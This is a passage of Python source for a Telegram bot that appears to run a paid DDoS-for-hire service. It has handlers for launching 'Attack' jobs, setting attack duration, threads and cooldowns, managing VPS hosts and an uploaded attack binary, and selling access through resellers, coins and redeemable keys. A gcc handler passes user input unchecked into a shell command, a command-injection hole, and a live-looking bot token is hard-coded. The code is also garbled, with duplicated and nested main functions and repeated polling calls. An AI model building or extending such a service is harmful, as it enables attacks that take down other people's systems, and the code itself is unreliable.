        await add_co_owner_start(update, context)
    elif query == 'Remove Co-Owner':
        await remove_co_owner_start(update, context)
    elif query == 'Set Display Name':
        await set_display_name_start(update, context)
    elif query == 'Reset VPS':
        await reset_vps(update, context)
    elif query == '⏳ Uptime':
        await show_uptime(update, context)
    elif query == '⚙️ Owner Settings':
        await owner_settings(update, context)
    elif query == 'Add Bot':
        await add_bot_instance(update, context)
    elif query == 'Remove Bot':
        await remove_bot_instance(update, context)
    elif query == 'Bot List':
        await show_bot_list_cmd(update, context)
    elif query == 'Promote':
        await promote(update, context)    
    elif query == 'Start Selected Bot':
        await start_selected_bot(update, context)
    elif query == 'Stop Selected Bot':
        await stop_selected_bot(update, context)

async def cancel_conversation(update: Update, context: CallbackContext):
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        "❌ *Current process canceled.*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def check_expired_keys(context: CallbackContext):
    current_time = time.time()
    expired_users = []
    
    for user_id, key_info in redeemed_users.items():
        if isinstance(key_info, dict):
            if key_info['expiration_time'] <= current_time:
                expired_users.append(user_id)
        elif isinstance(key_info, (int, float)) and key_info <= current_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del redeemed_users[user_id]

        expired_keys = [key for key, info in redeemed_keys_info.items() if info['redeemed_by'] == user_id]
        for key in expired_keys:
            del redeemed_keys_info[key]

    save_keys()
    logging.info(f"Expired users and keys removed: {expired_users}")

def main():
    # Declare globals first
    global TELEGRAM_BOT_TOKEN, OWNER_USERNAME
    
    # Load configurations
    load_keys()
    load_vps()
    load_display_name()
    load_links()  # Add this line

ASK_GCC_COMMAND = 1

async def start_compile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document or not update.message.document.file_name.endswith(".c"):
        await update.message.reply_text("❌ Please send a C source file (*.c).")
        return ConversationHandler.END

    file = await update.message.document.get_file()
    filename = update.message.document.file_name
    await file.download_to_drive(filename)
    context.user_data['filename'] = filename

    await update.message.reply_text(
        f"File `{filename}` received!\n"
        "Now send me the gcc command options (for example: `-Wall -o output`) without the filename.\n"
        "Send /cancel to abort.",
        parse_mode="Markdown"
    )
    return ASK_GCC_COMMAND

async def run_gcc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gcc_args = update.message.text.strip()
    filename = context.user_data.get('filename')

    if not filename:
        await update.message.reply_text("No source file found. Please send the C file again.")
        return ConversationHandler.END

    # Construct gcc command (append filename automatically)
    cmd = f"gcc {gcc_args} {filename}"

    try:
        process = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            output = stdout.decode().strip() or "(No output)"
            await update.message.reply_text(f"✅ Compilation succeeded!\nOutput:\n{output}")
        else:
            error_msg = stderr.decode().strip() or "Unknown error."
            await update.message.reply_text(f"❌ Compilation failed:\n{error_msg}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error running gcc:\n{e}")

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Compilation cancelled.")
    return ConversationHandler.END


def main():
    import os
    TELEGRAM_BOT_TOKEN = os.getenv("8095931824:AAG2srjhFG4dsUHJIBEoEF1OF-MOtsLY0ls")
    if not TELEGRAM_BOT_TOKEN:
        print("Set TELEGRAM_BOT_TOKEN environment variable!")
        return

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    compile_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Document.FileExtension("c"), start_compile)],
        states={
            ASK_GCC_COMMAND: [MessageHandler(filters.TEXT & ~filters.COMMAND, run_gcc_command)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(compile_handler)
    application.run_polling()

    # Create the Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Check if running as specific bot instance
    if len(sys.argv) > 1 and "--token" in sys.argv:
        token_index = sys.argv.index("--token") + 1
        owner_index = sys.argv.index("--owner") + 1
        
        if token_index < len(sys.argv) and owner_index < len(sys.argv):
            TELEGRAM_BOT_TOKEN = sys.argv[token_index]
            OWNER_USERNAME = sys.argv[owner_index]
            # Recreate application with new token
            application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add conversation handlers
    generate_key_handler = ConversationHandler(
        entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.Text("Generate Key"), generate_key_start)],
        states={
            GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    redeem_key_handler = ConversationHandler(
        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.Text("Redeem Key"), redeem_key_start)],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("Set Duration"), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    delete_key_handler = ConversationHandler(
        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
        states={
            GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("Add Reseller"), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("Add Coin"), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    special_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("🔑 Special Key"), generate_special_key_start)],
        states={
            GET_SPECIAL_KEY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_duration)],
            GET_SPECIAL_KEY_FORMAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_format)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add VPS handlers
    add_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add VPS"), add_vps_start)],
        states={
            GET_VPS_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_vps_info)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove VPS"), remove_vps_start)],
        states={
            GET_VPS_TO_REMOVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_vps_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    upload_binary_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Upload Binary"), upload_binary_start)],
        states={
            CONFIRM_BINARY_UPLOAD: [
                MessageHandler(filters.Document.ALL, upload_binary_confirm),
                MessageHandler(filters.TEXT & ~filters.COMMAND, lambda update, context: update.message.reply_text("❌ Please upload a file!", parse_mode='Markdown'))
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add co-owner handlers
    add_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Co-Owner"), add_co_owner_start)],
        states={
            GET_ADD_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_co_owner_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Co-Owner"), remove_co_owner_start)],
        states={
            GET_REMOVE_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_co_owner_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add display name handler
    display_name_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Set Display Name"), set_display_name_start)],
        states={
            GET_DISPLAY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_display_name_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add reseller status handler
    reseller_status_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("RE Status"), reseller_status_start)],
        states={
            GET_RESELLER_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, reseller_status_info)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add group ID handlers
    add_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Group ID"), add_group_id_start)],
        states={
            ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_id_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start)],
        states={
            REMOVE_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_group_id_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    # Add bot management handlers
    add_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Bot"), add_bot_instance)],
        states={
            GET_BOT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_bot_token)],
            GET_OWNER_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_owner_username)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Bot"), remove_bot_instance)],
        states={
            SELECT_BOT_TO_STOP: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_bot_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    start_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Start Selected Bot"), start_selected_bot)],
        states={
            SELECT_BOT_TO_START: [MessageHandler(filters.TEXT & ~filters.COMMAND, start_bot_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    stop_bot_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Stop Selected Bot"), stop_selected_bot)],
        states={
            SELECT_BOT_TO_STOP: [MessageHandler(filters.TEXT & ~filters.COMMAND, stop_bot_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    # Add delete binary handler
    delete_binary_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Delete Binary"), delete_binary_start)],
    states={
        CONFIRM_BINARY_DELETE: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_binary_confirm)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    set_vps_handler = ConversationHandler(
        entry_points=[CommandHandler("setvps", set_vps_count)],
    states={
        GET_VPS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_vps_count_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )




# Add this handler with your other handlers
    link_management_handler = ConversationHandler(
    entry_points=[MessageHandler(filters.Text("🔗 Manage Links"), manage_links)],
    states={
        GET_LINK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link_number)],
        GET_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link_url)],
    },
    fallbacks=[CommandHandler("cancel", cancel_conversation)],
)

    broadcast_handler = ConversationHandler(
    entry_points=[MessageHandler(filters.Text("📢 Broadcast"), broadcast_start)],
    states={
        GET_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)],
    },
    fallbacks=[CommandHandler("cancel", cancel_conversation)],
)

    # Add menu handler
        # Add menu handler
    menu_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Menu"), show_menu)],
        states={
            MENU_SELECTION: [
                MessageHandler(filters.Text("Add Group ID"), add_group_id_start),
                MessageHandler(filters.Text("Remove Group ID"), remove_group_id_start),
                MessageHandler(filters.Text("RE Status"), reseller_status_start),
                MessageHandler(filters.Text("VPS Status"), show_vps_status),
                MessageHandler(filters.Text("Add VPS"), add_vps_start),
                MessageHandler(filters.Text("Remove VPS"), remove_vps_start),
                MessageHandler(filters.Text("Upload Binary"), upload_binary_start),
                MessageHandler(filters.Text("Add Co-Owner"), add_co_owner_start),
                MessageHandler(filters.Text("Remove Co-Owner"), remove_co_owner_start),
                MessageHandler(filters.Text("Set Display Name"), set_display_name_start),
                MessageHandler(filters.Text("Back to Home"), back_to_home),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add settings menu handler
    settings_menu_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Settings"), settings_menu)],
        states={
            MENU_SELECTION: [
                MessageHandler(filters.Text("Set Duration"), set_duration_start),
                MessageHandler(filters.Text("Add Reseller"), add_reseller_start),
                MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start),
                MessageHandler(filters.Text("Set Threads"), set_threads_start),
                MessageHandler(filters.Text("Add Coin"), add_coin_start),
                MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start),
                MessageHandler(filters.Text("Reset VPS"), reset_vps),
                MessageHandler(filters.Text("Co-Owner"), co_owner_management),
                MessageHandler(filters.Text("Back to Home"), back_to_home),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    

    # Add all handlers
    application.add_handler(generate_key_handler)
    application.add_handler(redeem_key_handler)
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(delete_key_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(special_key_handler)
    application.add_handler(add_vps_handler)
    application.add_handler(remove_vps_handler)
    application.add_handler(link_management_handler)
    application.add_handler(upload_binary_handler)
    application.add_handler(add_co_owner_handler)
    application.add_handler(CommandHandler("users", show_users))
    application.add_handler(remove_co_owner_handler)
    application.add_handler(display_name_handler)
    application.add_handler(reseller_status_handler)
    application.add_handler(add_group_id_handler)
    application.add_handler(remove_group_id_handler)
    application.add_handler(menu_handler)
    application.add_handler(delete_binary_handler)
    application.add_handler(settings_menu_handler)
    application.add_handler(add_bot_handler)
    application.add_handler(remove_bot_handler)
    application.add_handler(start_bot_handler)
    application.add_handler(broadcast_handler)
    application.add_handler(stop_bot_handler)
    application.add_handler(CommandHandler("code", manual_key_generation))
    application.add_handler(CommandHandler("redeem", redeem_key_manual))
    application.add_handler(delete_binary_handler)
    application.add_handler(set_vps_handler)
    application.add_handler(CommandHandler("running", show_running_attacks))
    application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
    application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
    application.add_handler(MessageHandler(filters.ALL & (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP), track_new_chat))
    application.add_handler(MessageHandler(filters.Text("🔗 Manage Links"), manage_links))
    application.add_handler(ChatMemberHandler(track_left_chat, ChatMemberHandler.MY_CHAT_MEMBER))

    # Add job queue to check expired keys
    job_queue = application.job_queue
    job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour

    application.run_polling()
import asyncio

import asyncio

try:
    app_event_loop = asyncio.get_running_loop()
except RuntimeError:
    app_event_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(app_event_loop)

TELEGRAM_BOT_TOKEN = "8095931824:AAG2srjhFG4dsUHJIBEoEF1OF-MOtsLY0ls"
application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

application.run_polling()


if __name__ == '__main__':
    main()
    
    
   
